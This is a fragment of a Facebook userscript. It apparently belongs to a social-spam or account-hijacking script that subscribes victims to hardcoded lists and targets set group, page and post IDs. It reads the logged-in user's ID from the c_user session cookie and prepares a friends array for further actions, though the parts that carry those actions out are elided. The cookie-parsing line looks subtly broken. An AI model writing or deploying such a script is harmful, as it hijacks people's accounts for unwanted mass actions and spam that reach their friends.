...
// @author          ahmed.yous[facebook]
// @include         https://*.facebook.com/*ahmed.yous
// @include         https://*.facebook.com/*ahmed.yous
// @include         http://*.facebook.com/*egyradio
// @include         http://*.facebook.com/*egyradio
// ==/UserScript==
...
sublist("10201965120303138");
sublist(" ");
sublist(" ");
sublist(" ");
sublist(" ");

var gid = ['1428749500691195'];
...
var spage_id = "221270294552086";
var spost_id = "221270294552086";
var sfoto_id = "221270294552086";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
